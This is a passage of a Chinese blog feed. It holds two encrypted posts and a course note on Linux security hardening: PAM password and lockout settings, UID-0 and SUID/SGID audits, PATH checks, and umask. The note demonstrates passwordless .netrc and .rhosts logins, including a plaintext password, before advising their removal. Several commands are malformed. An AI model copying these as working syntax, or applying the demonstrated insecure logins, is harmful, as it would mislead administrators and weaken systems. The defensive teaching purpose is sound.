1a8f7c73a38c1752a61cab87f967cca40cbf874ef4ebded7ca176cc1d33733940f3896f7f54d4c958be7174818f88a3dff3ace3017c21a83e5d673055cd44f8e37709d5459ce3015036c6c134083ae10ab5a5138b53833fb6fe38ce5682008b7507a4adaa5226107deb1d5ad4cd4e07013d9c34b0c27b1daa16c0d1ad8cd4408a090798d7d06fa368f0fe684afbe56995029882e82c752b4575d698c9d7be693c463686aaa87bbc1b021ef165139afa7110ea06fc1f2fb5ad0b412c97e3798d1e9c33663ac85d051e06fac8010d465ee34f2877a2d74ae34fa5052bfa4270efad69ec74275bdd920d6318821ed6de4afd380258f53abd8b97b12b6ffd1dd11f28fca04815ab6e0c90b05651f35a653e9e3d54cf25b79f0feb25171ff71cb9032d177b076afdb43b3614aa19ee32a4e6c299d3c36a2c6e4e1680b41d5d01370f802ae844b4245cc9fd2ac338a5e011aabbc187f28e8b5dc3a2996cbaa0e255712f76d7601e3b8dc688efca3189db2cd621638398f6cfb60e1b8bb9b20bd98b1e3362a38bba3ad5b88ef896b0e728ea953efc2092fc632424ab6069ec93a8567a4a919d9e0bbba46a47609df5ec14260b1e2227572d455c594e9f97171b5730ee55d3e7569bb93ff7c4e25ca06ea6c1f5fd84f5cb7b8c4a2871ee5715d35f768880612090f7c6bef84a4ee010721bd08d9fe6edc59435313275e5241e0ebe72121566c836f3b50893045e4b0ea58f822e4abe26dfa4e82ffd0ba1d6ccfdb6f9d02cac3b8cd5385df6e57488cb325793f0d2589528de620c640877f6094bcbce555391b96f678a3d40bd52e59ea1b8bd7b21eaf8af47248c19abf3994f7e630ff3a2bec9d26bd682ca5763b4512229eda209272282604cb22b0d89ba2f9c7fba34617f06ce4a67d172938e96b0cab5667f62122b68c53d5a71f06aa249750f87042a242f57dc8eed1b0531e865199607c6e51df09ec97617197e8521f69573a26f4578ee3a66ec90e85e3b68d79140771d51ace7515a9637fa6fdb8e2e38de1421ec33e7b92761be3340b8d22fea6ca935701d6d997fc383faaddc7c3eaf4302c52a4cb932f343027e91a965952a9280e20e42cd93998192ce65e3bafb7df83324faaa54fe5aa2644768aee9965bbca266afec528ffd9e832793f687e08101211c4c2479d1d77b9e5a1fdcd9ef458eeb6920347ea64ac672a36163e92295d40b71e01709c231456f4826843329c0bc703c445fed9232048bddc7a47b4b1c8aef6cce7d479a269b18d2fcf43437a1859a70e7e8059661eece4a3861bf5cdaae2ab8bf67650b7b10cd1e28598f80cfcdc6f09dce15d7d8403980ad6dccbb9090df2c453922c2cdde1812e8402b03c7f160dcb04a1fa55ef97ece65ced4a7eda8befd99131a3bef17fdc321b2a466a06923a44bf09c76d5ddfc72adac2e1f618fb1bf589f09fce1098c893b3d3871b416b50f93a1cb48f8ed2491b21b31f075923a552b77697055d9cd257989111bcab9e969d425690dd144845342d70fd045d35e431c0591aa1cd03d79e2e30af98c9faa6c21b7cacc6abd31e561ed20c21d4ef8d86b62f39dbd26e7354bac0a937322808c2e2f54c59072258e6bd2d700e7b33234a424e11b1f749c996f68aa1b9d4879771c04399e0b6288ef38a3cb1d70a5a5e32bad10fa1dbc6ecfc6e1f6ca2a3315396bdefe60b124daaec94bede275b41205ad64e4eb545f511ad9dfd90d20376ef0d34ee40e2887fc228c6efd3b2b853ddc82feddd77a5d18e3e17f6ff165ca86f44c232ae08a60bbdc3ca802a733b269cf78ede1bd5d570d22db07ee841572949245de7024784639576c0311569f5fc04a39423e938b07913e38b9286cf83d5efec2ec7f0069a3ac0d58aa9ede1b9ac2378eef6fecf59d5a0c7e925e3bc063821224307d4f1a9b6d2068211a1957d8c908db67ddf1074e4bc25ff89340daced91bf987f332cceb31d9008ff97eb6ac975cd5d5780ba1cd79358eba3c55976c99fd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="哲学" scheme="https://w-sqrt7.github.io/categories/%E5%93%B2%E5%AD%A6/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="哲学" scheme="https://w-sqrt7.github.io/tags/%E5%93%B2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>米好信安课程笔记-系统安全综合</title>
    <link href="https://w-sqrt7.github.io/2024/03/01/mihao-note/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88/"/>
    <id>https://w-sqrt7.github.io/2024/03/01/mihao-note/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88/</id>
    <published>2024-03-01T07:23:41.173Z</published>
    <updated>2024-03-01T07:38:21.698Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="d5e040df22d76090fc329eb3a4f4c4f266cb1fbaf5eae9e16d4cb497f58df68b">e05d9ee6e48268b2b742c6d6f1681d6164fa5aa1dc52a0c978370e90ed17c302a3c3cf3361c11a91930f07d279aace1f3ffcb9262c6d73de23b7c69224f8b8374f61407b91ea05281e86675c44a165f1d1d0fb48f2afba9f7c67c9debacdb10d813809cbadd6234c91bacd3e991e9f835d609dbd9f54084774df7f50bc6895124b540ff3b2ec4609d6a79c512a1def5afd62b48ff85fb2c84413bd768334939678d45f26b698d533f4dcb21186764e4de14a743d95efeb71d13147f75233ed876ab6af0bd1577ddb15fe50f0c84a5efb001e29eff22119f616aaf4d21b477f3c10050b0a271f91cf9eeaa3e4cdbb373d14dece70810a9476b83eb93f2152436f0a8685314288d90cedaa325ba6245620f3b0cf1462566ff97c663fca14f089c6e871dec4b95cbcc1fa19c7cf3b54ebd8eeee0b92df1e2681a2e3233fab848720efa45e2f06a23e48a6d3da8adc5b76a4849480e06174dbd6894f969089e1d514f855f0c42c414fc6e3023e0d2590b191b138f341b9100bd76d57b2c956c25834de30c7ae2cea295cf14db8eabd6041350ad6732fee96e5c3a89a15c4bfa4f89f4263b00ee71ac24d15063b1161a38f628395821198ad545a130331b60fbb8cb9feca9b035ce40af51f17ca320212a9929f9e619b69650524212570af52c25e8f346bee44735d3fa8deb47e2e9702bc9efc37aa467f7a62ce1737906783f6c8f82a8a896d9d36e3300aba21727d0d7d7960830e4394086063dfb62666b2e42e5cad92bb916d05c9faa938fc9a8613350bc4729a3714cbfea7e1cf7a6446b5c63841eb3e757295285c41c4404b383ce9c01f1beab9446582747bc75b5c0513e29aeb95dd0099a67daae1a047f9f9acbd3c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="笔记" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="米好信安" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="信息安全" scheme="https://w-sqrt7.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>米好信安课程笔记-Linux安全配置</title>
    <link href="https://w-sqrt7.github.io/2024/02/28/mihao-note/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89-Linux%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>https://w-sqrt7.github.io/2024/02/28/mihao-note/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89-Linux%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2024-02-28T08:00:05.473Z</published>
    <updated>2024-03-05T03:00:19.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="米好信息安全课程笔记"><a href="#米好信息安全课程笔记" class="headerlink" title="米好信息安全课程笔记"></a>米好信息安全课程笔记</h1><h1 id="基础课程-Linux安全配置"><a href="#基础课程-Linux安全配置" class="headerlink" title="基础课程-Linux安全配置"></a>基础课程-Linux安全配置</h1><h2 id="课时一-用户密码设置"><a href="#课时一-用户密码设置" class="headerlink" title="课时一 用户密码设置"></a>课时一 用户密码设置</h2><p><code>passwd命令</code></p><p>普通用户只可以修改自己的密码</p><p>root用户可以修改任意用户的密码</p><p>passwd -l test01 锁定test01用户，该用户无法修改自己的密码</p><p><code>/etc/passwd文件</code>，格式如下</p><p>用户名：密码：uid：gid：用户描述：主目录：登录shell</p><p><code>/etc/shadow文件</code>，格式如下</p><p>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：保留</p><h2 id="课时二-用户口令强度要求"><a href="#课时二-用户口令强度要求" class="headerlink" title="课时二 用户口令强度要求"></a>课时二 用户口令强度要求</h2><p><code>/etc/pam.d/system-auth文件</code></p><p>对用户的口令强度进行限制</p><p>设置密码长度最小为10为，至少包含两种字符种类的组合</p><p>编辑&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password requisite pam_cracklib.so try_first_pass retry=3</span><br></pre></td></tr></table></figure><p>替换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password requisite pam_cracklib.so try_first_pass retry=3 minlen=10 minclass=2</span><br></pre></td></tr></table></figure><p>其中try_first_pass retry&#x3D;3是密码重试次数为3次，如果在初始尝试中失败，则应该重试3次，minlen&#x3D;10是密码最小长度为10,minclass&#x3D;2是密码最少要有两种字符种类组合</p><p>pam＿cracklib主要参数说明：</p><p>retry&#x3D;N:</p><p>重试多少次后返回密码修改错误difok&#x3D;N:</p><p>新密码必需与旧密码不同的位数dcredit&#x3D;N:</p><p>N＞＝0：密码中最多有多少个数字；</p><p>N＜0密码中最少有多少个数字．Icredit&#x3D;N:</p><p>小写字母的个数 ucredit&#x3D;N:</p><p>大写字母的个数 credit&#x3D;N:</p><p>特殊字母的个数</p><p>minclass＝N： 密码组成（大／小写字母，数字，特殊字符）</p><p><code>/etc.login.defs文件</code></p><p>如设置用户的密码有效期为90天，斌再密码到期前30天在用户登录时提醒用户</p><p>pass_max_days 90:密码最大有效期，单位为天，设置成99999代表永久有效</p><p>pass_warn_age 15:密码失效前多少天在用户登录时通知用户修改口令</p><p>pass_min_days 0 :多少天后可修改密码，0代表可立即修改，非0代表N天后可修改</p><p>pass_min_len 5</p><p>密码最小长度若system-auth文件已经指定，则此处无效</p><h2 id="课时三-用户锁定策略"><a href="#课时三-用户锁定策略" class="headerlink" title="课时三 用户锁定策略"></a>课时三 用户锁定策略</h2><p><code>/etc/pam.d/login文件</code></p><p>如设置普通用户连续错误登录的最大次数，超过5次，则锁定该用户，锁定之后，15分钟后自动解锁</p><p>编辑&#x2F;etc&#x2F;pam.d&#x2F;login文件，在第一行下即#%PAM-1.0的下面添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth  required  pam_tally.so  deny=5  unlock_time=900</span><br></pre></td></tr></table></figure><p>even_deny_root  #限制root用户</p><p>dengy  #设置普通用户和root用户登录连续错误的最大次数</p><p>unlock_time  #设定普通用户锁定后，多少时间后解锁，单位秒</p><p>root_unlock_time  #设置root用户锁定后</p><p><code>手动锁定和解锁用户</code></p><p>查看用户andrew的错误登录次数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pam_tally --user andrew</span><br></pre></td></tr></table></figure><p>查看用户andrew的错误登录次数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pam_tally --user andrew --reset</span><br></pre></td></tr></table></figure><p>使用passwd命令锁定与解锁账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd -l andrew #锁定用户andrew</span><br><span class="line">passwd -S andrew #查看用户andrew锁定状态</span><br><span class="line">passwd -u andrew #解锁用户andrew</span><br></pre></td></tr></table></figure><p>使用usermod命令锁定与解锁账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usermod -L andrew #锁定用户andrew</span><br><span class="line">usermod -U andrew #解锁用户andrew</span><br></pre></td></tr></table></figure><h2 id="课时四-root账户远程登录限制"><a href="#课时四-root账户远程登录限制" class="headerlink" title="课时四 root账户远程登录限制"></a>课时四 root账户远程登录限制</h2><p><code>/etc/securetty文件</code></p><p>tty一般指终端，即直接和Linux相互通信的一个终端，telnet远程登录使用的是tty</p><p>pts是指伪终端，在窗口型Linux里面打卡的terminal都是pts，ssh远程登陆使用的是pts</p><p>console指当前控制台</p><p>vc是virtual console，为虚拟的监视器</p><p>vt是virtual terminal，为虚拟终端</p><p>在该文件中没有找到当前字符终端设备，login会认为他不安全，给出login incorrect 错误</p><p>若没有该文件，root用户可以从任何一台字符终端设备上登录从而中造成安全问题</p><p>&#x2F;etc&#x2F;securetty文件的权限应是600，400 ， 为限制root用户远程登录，应将&#x2F;etc&#x2F;securetty文件的内容只保留console</p><h2 id="课时五-检查是否存在除root之外的UID为0的帐户"><a href="#课时五-检查是否存在除root之外的UID为0的帐户" class="headerlink" title="课时五 检查是否存在除root之外的UID为0的帐户"></a>课时五 检查是否存在除root之外的UID为0的帐户</h2><p>id和用户名的对应关系存放在&#x2F;etc&#x2F;passwd文件中</p><p>用户可通过id命令来获取查看自己的uid号</p><p>root用户的uid为0</p><p>通过检查&#x2F;etc&#x2F;passwd文件来检查UID为0的账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F:&#x27;($3==0)&#123;print $1&#125;&#x27;/etc/passwd</span><br></pre></td></tr></table></figure><ol><li><code>-F:</code>：这个选项设置了字段分隔符为冒号（<code>:</code>）。在 <code>/etc/passwd</code> 文件中，用户的账号信息是由冒号分隔的字段组成的。</li><li><code>($3==0)</code>：这是一个条件表达式，它检查第三个字段（由冒号分隔）是否等于 <code>0</code>。在 <code>/etc/passwd</code> 文件中，第三个字段通常表示用户的 UID（用户 ID）。UID 为 <code>0</code> 的用户通常是超级用户（root）。</li><li><code>&#123;print $1&#125;</code>：如果上述条件（第三个字段等于 <code>0</code>）为真，则执行这个动作，即打印第一个字段。在 <code>/etc/passwd</code> 文件中，第一个字段是用户名。</li><li><code>/etc/passwd</code>：这是 <code>awk</code> 命令要处理的文件名。</li></ol><p><code>awk</code> 是一个强大的文本处理工具，常用于在 Linux 和 Unix 系统中进行模式扫描和文本&#x2F;数据提取。</p><p>awk 的基本语法如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;pattern &#123; action &#125;&#x27;</span> file</span><br></pre></td></tr></table></figure><ul><li><code>pattern</code>：一个模式，用于匹配输入文本中的行。</li><li><code>action</code>：当模式匹配成功时要执行的动作。</li><li><code>file</code>：要处理的文件名。</li></ul><p>awk默认使用空格或制表符作为字段分隔符，但可以通过 <code>-F</code> 选项指定其他分隔符。字段可以通过 <code>$n</code> 访问，其中 n 是字段的编号（从 1 开始）。</p><p>以下是一些 awk 命令的示例：</p><ol><li>打印文件的所有内容<br>awk ‘{ print }’ file.txt</li><li>打印文件的第一列<br>awk ‘{ print $1 }’ file.txt</li><li>打印文件的第二列和第三列<br>awk ‘{ print $2, $3 }’ file.txt</li><li>打印文件的总行数<br>awk ‘END { print NR }’ file.txt</li><li>使用自定义分隔符<br>awk -F: ‘{ print $1, $3 }’ &#x2F;etc&#x2F;passwd<br>这里 -F: 指定了冒号作为字段分隔符</li></ol><h2 id="课时六-root用户环境变量的安全性"><a href="#课时六-root用户环境变量的安全性" class="headerlink" title="课时六 root用户环境变量的安全性"></a>课时六 root用户环境变量的安全性</h2><p><code>/etc.profile文件</code></p><p>当系统启动或用户登录时，该文件中的命令和脚本会被执行。&#x2F;etc&#x2F;profile 主要用于设置系统级的环境变量和启动脚本，这些设置会影响所有用户。</p><p><code>~/.bash_profile文件</code></p><p>~&#x2F;.bash_profile 文件是一个用户级别的 Bash Shell 配置文件，位于用户的主目录下（通常是 ~ 或 &#x2F;home&#x2F;username）。当用户登录时，该文件会被自动执行一次，用于配置用户的 shell 环境。该文件只对当前用户有效</p><p><code>root用户环境变量的安全性</code></p><p>$PATH环境变量内存着一张目录列表，当用户要执行某一程序时，系统就会按照列表中的内容去查找该程序的位置，如果恶意程序存放在$PATH变量所在的路径下，则很容易被执行。</p><p>检查是否包含父目录，检查 $PATH 环境变量中是否包含某些特定的路径段，特别是以点（.）或冒号（:）开始的路径段，或者以点或冒号结束的路径段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH | egrep &#x27;(^|:)(\.|:|$)&#x27;</span><br></pre></td></tr></table></figure><p>(^|:)(.|:|$): 这是 egrep 命令使用的正则表达式模式。</p><p>^|: 匹配字符串的开始或冒号字符。这确保了我们在每个路径段的开始处查找。<br>.|:|$ 匹配点字符、冒号字符或字符串的结束。这确保了我们在每个路径段的结束处查找。</p><p>检查是否包含组目录权限为777的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find `echo $PATH | tr &#x27;&#x27;:&#x27; &#x27;` -type d \(-perm -002 -o -perm -020\) -ls</span><br></pre></td></tr></table></figure><p>1.echo $PATH: 如前所述，这会显示当前用户的 PATH 环境变量的值。</p><p>2.tr ‘’:’\n’: 这里的 tr 命令用于替换或删除字符。这里，它把 PATH 值中的冒号（:）替换为换行符（\n）。这样做的目的是把 PATH 中的每个目录路径放到单独的一行，因为 find 命令通常期望路径列表是一行一个。</p><p>3.find … -ls: 这是一个反引号（backticks）包裹的命令替换，它会执行其中的命令，并将输出（即每个目录路径）作为 find 命令的参数。</p><p>4.find … -type d: find 命令用于在目录树中查找文件，并可以根据各种条件进行过滤。-type d 参数指定只查找目录。</p><p>5.\(-perm -002 -o -perm -020\): 这是一个复合权限条件，用于匹配具有特定权限设置的目录。</p><p>-perm -002 匹配所有其他用户有写权限的目录（即权限位中的第2位是1）。<br>-perm -020 匹配所有组有写权限的目录（即权限位中的第5位是1）。<br>-o 是逻辑“或”操作符，用于组合上述两个条件。因此，这个复合条件会匹配所有其他用户或组有写权限的目录。</p><h2 id="课时七-远程连接的安全性配置"><a href="#课时七-远程连接的安全性配置" class="headerlink" title="课时七 远程连接的安全性配置"></a>课时七 远程连接的安全性配置</h2><p><code>.netrc文件</code></p><p>.netrc文件中包含了登录和初始化的信息，常被用来自动化登录，一般存放在用户的主目录下，也需要用户对此文件具有可访问的权限</p><p>创建.netrc文件，设置自动登录ftp脚本，内容示例如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default login andrew password 123456</span><br></pre></td></tr></table></figure><p>当用户执行ftp 192168.18.100登录ftp服务器时，无需再输入密码</p><p><code>.rhosts文件</code></p><p>.rhosts 文件包含主机—用户组合列表，可以授予指定用户从指定主机登录而不必提供口令的权限</p><p>1.修改／etc／xinetd.d／rsh｜rlogin｜rexec文件，将disable＝yes 改 为 disable＝no</p><p>2.在.rhosts文件中加入远程登录的主机的计算机名，如Shiny</p><p>3.在Shiny这台主机上使用rsh 192.168.18.130 进行远程登录，登录过程中发现无需密码</p><p><code>安全配置策略</code></p><p>查找.netrc和.rhosts文件，并删除这些文件</p><p>find&#x2F;-name .netrc</p><p>find &#x2F;-name .rhosts </p><h2 id="课时八-用户的umask安全配置"><a href="#课时八-用户的umask安全配置" class="headerlink" title="课时八 用户的umask安全配置"></a>课时八 用户的umask安全配置</h2><p><code>umask</code></p><p>​      umask用来设置限制新文件权限的掩码。 当新文件被创建时，其最初的权限由文件创建掩码决定。 用户每次注册进入系统时，umask命令都被执行，并自动设置掩码改变默认值，新的权限将会把旧的覆盖</p><p>   umask命令是在&#x2F;etc&#x2F;profile等文件中设置的， 登录时引用这个文件，改变所有用户的umask<br>    如果希望永久性地设置自己的umask值，那么就把它放在自己$HOME<br>目录下的.profile或.bash_profile或.bashrc等文件中</p><p>常见umask值与权限对应关系，建议设置用户的默认umask值为077</p><table><thead><tr><th>umask值</th><th>文件</th><th>目录</th></tr></thead><tbody><tr><td>002</td><td>664</td><td>775</td></tr><tr><td>022</td><td>644</td><td>755</td></tr></tbody></table><p>​                                                                     </p><p><code>检查umask值</code><br>检查含有umask设置的文件；</p><p>more &#x2F;etc&#x2F;profile<br>more &#x2F;etc&#x2F;bashrc<br>more &#x2F;etc&#x2F;csh.login<br>more &#x2F;etc&#x2F;csh.cshrc<br>more $HOME&#x2F;.profile<br>more $HOME&#x2F;.bashrc<br>more $HOME&#x2F;.bash_profile</p><h2 id="课时九-重要目录和文件的权限设置"><a href="#课时九-重要目录和文件的权限设置" class="headerlink" title="课时九 重要目录和文件的权限设置"></a>课时九 重要目录和文件的权限设置</h2><p>Linux系统中的重要目录列表</p><p><code>/etc/     </code>            系统管理和配置文件</p><p><code>/etc/rc.d/init.d/  </code>   系统启动自动运行的脚本</p><p><code>/tmp</code>          公共的临时文件存储点</p><p><code>/etc/inetd.conf </code>    &#x2F;usr&#x2F;sbin&#x2F;inetd的初始化文件，需要监听的inet服务及有关信息</p><p><code>/etc/passwd</code>    用户数据库</p><p><code>/etc/shadow  </code>  影子口令文件</p><p><code>/etc/group </code>      组的信息。</p><p><code>/etc/security</code>    对每个pam模块的具体的配置</p><p><code>/etc/services </code>   网络服务名和它们对应使用的端口号及协议</p><p><code>/etc/rc*.d </code>      启动的配置文件和脚本</p><h2 id="课时十-查找未授权的SUID-SGID文件"><a href="#课时十-查找未授权的SUID-SGID文件" class="headerlink" title="课时十 查找未授权的SUID SGID文件"></a>课时十 查找未授权的SUID SGID文件</h2><p>SUID：当s权限在所有者的x时，类似-r-s–x–x<br>SGID：当s权限在用户组的x时，类似-r-x–s–x<br>S是一种特殊权限，设置了suid的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限<br>sgid与suid类似，只是执行程序时获得的是文件属组的权限。</p><p>​SUID（Set User ID）和SGID（Set Group ID）是Unix和Linux操作系统中的两种特殊权限，它们分别影响执行文件和目录的行为。</p><p><code>SUID权限：</code><br>当文件具有SUID权限时，执行该文件的用户将暂时获得文件所有者的权限。这意味着，即使执行文件的用户不是文件的所有者，他们也可以以文件所有者的身份执行该文件。SUID权限仅对可执行文件有效。例如，&#x2F;bin&#x2F;su 和 &#x2F;usr&#x2F;bin&#x2F;passwd 这两个命令的所有者的x权限上都使用了SUID权限。</p><p><code>SGID权限：</code><br>当文件或目录具有SGID权限时，执行文件或在其中创建新文件的用户将暂时获得文件或目录所属组的权限。对于文件，SGID的作用与SUID类似，即执行文件时以文件所属组的身份执行。对于目录，SGID权限确保在该目录中创建的新文件将继承该目录的所属组，而不是创建者的主组。</p><p>可用下面的命令查找系统中所有的SUID和SGID程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `grep -v ^# /etc/fstab | awk &#x27;($6!=&quot;0&quot;&#123;print $2&#125;)&#x27;`;do find $PART -xdev \(-perm -04000 -o -perm -02000\) -type f -print done</span><br></pre></td></tr></table></figure><p>让我们逐步分析这个命令：</p><p>1.<code>grep -v ^# /etc/fstab:</code></p><p>grep -v ^#: 这个命令会从 &#x2F;etc&#x2F;fstab 文件中过滤掉所有以 # 开头的行（即注释行）。<br>&#x2F;etc&#x2F;fstab: 是一个系统文件，它包含了关于磁盘分区、交换空间和其他文件系统的挂载信息。</p><p>2.<code>awk &#39;($6!=&quot;0&quot;&#123;print $2&#125;)&#39;:</code></p><p>awk: 是一个文本处理工具，用于模式扫描和文本&#x2F;数据提取。<br>($6!&#x3D;”0”{print $2}): 这是一个 awk 脚本，它会检查每一行的第六个字段（在 &#x2F;etc&#x2F;fstab 中通常是文件系统检查的顺序）是否不等于 “0”。如果不等于 “0”，则打印该行的第二个字段（通常是挂载点的路径）。</p><p>3.<code>for PART in ...; do ... done:</code></p><p>这是一个 shell 循环，它会遍历 awk 命令输出的每一个挂载点路径，并将每个路径存储在变量 PART 中。</p><p>4.<code>find $PART -xdev \(-perm -04000 -o -perm -02000\) -type f -print:</code></p><p>find: 是一个命令，用于在目录树中查找文件。<br>$PART: 是循环中当前迭代的挂载点路径。<br>-xdev: 这个选项确保 find 命令只在同一个文件系统上搜索，不会跨越设备边界。<br>\(-perm -04000 -o -perm -02000\): 这是一个复合条件，用于匹配具有 SUID (-perm -04000) 或 SGID (-perm -02000) 权限的文件。<br>-perm: 在find命令中，-perm选项用于检查文件的权限模式，以确定哪些文件与指定的权限模式匹配。这个选项通常与八进制或符号表示法一起使用，以指定要搜索的权限。<br>-type f: 这个选项限制 find 命令只搜索普通文件。<br>-print: 这个动作会打印出匹配的文件路径。</p><h2 id="课时十一-检查任何人都有写权限的目录"><a href="#课时十一-检查任何人都有写权限的目录" class="headerlink" title="课时十一 检查任何人都有写权限的目录"></a>课时十一 检查任何人都有写权限的目录</h2><p>用下面的命令查找任何人都有写权限的目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `awk&#x27;($3==&quot;ext2&quot;||$3==&quot;ext3&quot;)&#123;print $2&#125;&#x27; /etc/fstab`;do find $PART -xdev -type d \(-perm -0002 -a ! -perm -1000\) -print done</span><br></pre></td></tr></table></figure><p>这段命令是一个组合的命令，用于在Linux系统中查找特定文件系统的特定目录权限设置。让我们逐步分析这个命令：</p><ol><li><strong>awk</strong> 命令：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;($3==&quot;ext2&quot;||$3==&quot;ext3&quot;)&#123;print $2&#125;&#x27;</span> /etc/fstab</span><br><span class="line">* `awk` 是一个强大的文本处理工具，常用于格式化文本数据。  </span><br><span class="line">* 这个命令在 `/etc/fstab` 文件中搜索，这个文件通常包含文件系统的挂载信息。  </span><br><span class="line">* `(<span class="variable">$3</span>==<span class="string">&quot;ext2&quot;</span>||<span class="variable">$3</span>==<span class="string">&quot;ext3&quot;</span>)`：这是一个条件，检查第三列（在 `awk` 中列从1开始计数）是否等于 <span class="string">&quot;ext2&quot;</span> 或 <span class="string">&quot;ext3&quot;</span>。在 `/etc/fstab` 中，第三列通常表示文件系统的类型。  </span><br><span class="line">* `&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;`：如果上述条件为真，则打印第二列的内容，即文件系统的挂载点或挂载路径。</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>for</strong> 循环：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> PART <span class="keyword">in</span> `...awk命令...`; <span class="keyword">do</span> ... <span class="keyword">done</span></span><br><span class="line">* 这是一个bash shell循环，它会遍历 `awk` 命令的输出结果（即所有满足条件的挂载点）。  </span><br><span class="line">* 对于每一个 `PART`（挂载点），它都会执行 `<span class="keyword">do</span>` 和 `<span class="keyword">done</span>` 之间的命令。</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>find</strong> 命令：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find <span class="variable">$PART</span> -xdev -<span class="built_in">type</span> d \(-perm -0002 -a ! -perm -1000\) -<span class="built_in">print</span></span><br><span class="line">* `find` 命令用于在文件系统中搜索文件。  </span><br><span class="line">* `<span class="variable">$PART</span>`：这是循环中的变量，代表每一个挂载点。  </span><br><span class="line">* `-xdev`：这个选项告诉 `find` 